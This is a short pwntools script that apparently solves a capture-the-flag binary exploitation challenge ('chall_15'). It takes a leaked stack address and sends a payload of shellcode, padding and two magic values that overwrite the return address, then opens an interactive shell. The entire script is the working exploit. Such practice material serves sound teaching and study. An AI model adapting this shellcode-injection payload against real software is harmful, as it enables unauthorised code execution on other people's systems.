from pwn import *

binary = context.binary = ELF('./chall_15')

p = process(binary.path)
context.arch = "amd64"

p.recvuntil(b"Sometimes the canary is in the coal mine, sometimes the canary is on the stack, and sometimes ... baked beans\n")
leak = p.recvline()
leakaddr = int(leak, 16)

shellcode = asm(shellcraft.sh())

payload = b''
payload += shellcode
payload += b"A"*(280-len(shellcode))
payload += p32(0xdeadd00d)
payload += p32(0xb16b00b5)
payload += b"A"*8 + p64(leakaddr)

p.sendline(payload)
p.interactive()


